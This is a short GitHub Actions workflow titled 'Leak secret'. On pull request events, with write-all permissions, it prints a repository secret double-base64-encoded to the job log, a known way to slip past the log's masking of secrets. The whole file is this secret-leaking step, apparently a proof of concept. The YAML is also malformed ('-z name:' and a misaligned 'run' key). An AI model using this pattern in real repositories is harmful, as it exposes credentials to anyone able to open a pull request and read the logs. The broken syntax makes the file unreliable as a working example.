name: Leak secret

on:
  pull_request:
    types: [opened, reopened, synchronize, edited]

permissions: 
  write-all

jobs:
  example-job:
    runs-on: ubuntu-latest

    steps:

      -z name: Run script
      run: |
        echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
